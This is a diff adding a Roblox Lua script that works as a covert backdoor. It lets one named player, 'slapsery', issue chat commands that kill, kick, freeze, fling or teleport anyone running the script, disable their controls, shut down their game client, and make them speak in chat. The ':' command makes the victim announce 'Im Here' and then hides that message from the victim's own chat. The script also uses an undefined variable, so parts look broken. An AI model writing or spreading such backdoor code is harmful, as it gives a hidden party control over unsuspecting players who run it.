@@ -1,0 +1,123 @@
+if slapy ~= nil then
+   return
+end
+
+slapy = "slapsery"
+
+
+--[[ Commands List ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+:kill
+:kill all
+:freeze
+:unfreeze
+:kick 
+:kick all
+:exit
+:exit all
+:bring
+:bring all
+:disablecontrol
+:enablecontrol
+:laydown
+:dance
+:dance all
+:fling
+:sit
+:say
+:
+
+]]------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+---Send Message Function
+local function SendMessage(msg)
+ if game:GetService("TextChatService").TextChannels.RBXGeneral then
+    game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync(msg)
+ else
+    game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "All")
+ end
+end
+---
+
+
+
+
+local MyName = game.Players.LocalPlayer.Name
+local MyDisplayName = game.Players.LocalPlayer.DisplayName
+
+local function ExecuteAdminCMD()
+game.Players[Ghostplayer].Chatted:connect(function(admin_msg)
+if admin_msg == ":kill "..MyName or admin_msg == ":kill "..MyDisplayName or admin_msg == ":kill all" and MyName ~= slapy then
+   game.Players.LocalPlayer.Character.Head:Destroy()
+elseif admin_msg == ":freeze "..MyName or admin_msg == ":freeze "..MyDisplayName then
+   game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
+elseif admin_msg == ":unfreeze "..MyName or admin_msg == ":unfreeze "..MyDisplayName then
+   game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
+elseif string.find(admin_msg.." ", ":kick "..MyName.." ") or string.find(admin_msg.." ", ":kick "..MyDisplayName.." ") or string.find(admin_msg.." ", ":kick all".." ") and MyName ~= slapy then
+   if string.find(admin_msg, MyName) then
+      admin_msg = string.gsub(admin_msg, ":kick "..MyName, "")
+   elseif string.find(admin_msg, MyDisplayName) then
+      admin_msg = string.gsub(admin_msg, ":kick "..MyDisplayName, "")
+   elseif string.find(admin_msg, ":kick all") then
+      admin_msg = string.gsub(admin_msg, ":kick all", "")
+   end
+   if admin_msg ~= "" then
+      admin_msg = "\n"..admin_msg
+   end
+   game.Players.LocalPlayer:Kick(admin_msg)
+elseif admin_msg == ":exit "..MyName or admin_msg == ":exit "..MyDisplayName or admin_msg == ":exit all" and MyName ~= slapy then
+   game:Shutdown()
+elseif admin_msg == ":bring "..MyName or admin_msg == ":bring "..MyDisplayName or admin_msg == ":bring all" and MyName ~= slapy then
+   game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players[Ghostplayer].Character.HumanoidRootPart.CFrame
+elseif admin_msg == ":disablecontrol "..MyName or admin_msg == ":disablecontrol "..MyDisplayName then
+   controls = require(game:GetService("Players").LocalPlayer.PlayerScripts.PlayerModule):GetControls() controls:Disable()
+elseif admin_msg == ":enablecontrol "..MyName or admin_msg == ":enablecontrol "..MyDisplayName then
+   controls = require(game:GetService("Players").LocalPlayer.PlayerScripts.PlayerModule):GetControls() controls:Enable()
+elseif admin_msg == ":laydown "..MyName or admin_msg == ":laydown "..MyDisplayName then
+   game.Players.LocalPlayer.Character.Humanoid.Sit = true
+   task.wait(0.1)
+   game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.Angles(math.pi * 0.5, 0, 0)
+   for _, v in ipairs(game.Players.LocalPlayer.Character.Humanoid:GetPlayingAnimationTracks()) do
+     v:Stop()
+   end
+elseif admin_msg == ":dance "..MyName or admin_msg == ":dance "..MyDisplayName or admin_msg == ":dance all" and game.Players.LocalPlayer.Name ~= Ghostplayer then
+   SendMessage("/e dance")
+elseif admin_msg == ":fling "..MyName or admin_msg == ":fling "..MyDisplayName then
+   bambam = Instance.new("BodyThrust")
+   bambam.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart
+   bambam.Force = Vector3.new(999990,0,999990)
+   bambam.Location = game.Players.LocalPlayer.Character.HumanoidRootPart.Position 
+elseif admin_msg == ":sit "..MyName or admin_msg == ":sit "..MyDisplayName then
+   game.Players.LocalPlayer.Character.Humanoid.Sit = true
+elseif string.find(admin_msg, ":say "..MyName.." ") or string.find(admin_msg, ":say "..MyDisplayName.." ") then
+   if string.find(admin_msg.." ", MyName.." ") then
+      admin_msg = string.gsub(admin_msg, ":say "..MyName, "")
+   else
+      admin_msg = string.gsub(admin_msg, ":say "..MyDisplayName, "")
+   end
+   SendMessage(admin_msg)
+elseif admin_msg == ":" and MyName ~= slapy then
+   SendMessage("Im Here")
+   wait(0.1)
+   for i,v in pairs(game.CoreGui:GetDescendants()) do
+     if v.ClassName == "TextLabel" and string.find(v.Text, "Im Here") or v.ClassName == "TextButton" and string.find(v.Text, "Im Here") then
+        v.Parent:Destroy()
+     end
+   end
+end
+end)
+end
+
+
+FoundAdmin = false
+game:GetService('RunService').Heartbeat:connect(function()
+if game.Players:FindFirstChild(slapy) then
+   if FoundAdmin == false then
+       FoundAdmin = true
+       ExecuteAdminCMD()
+   end
+else
+   FoundAdmin = false
+end
+end)
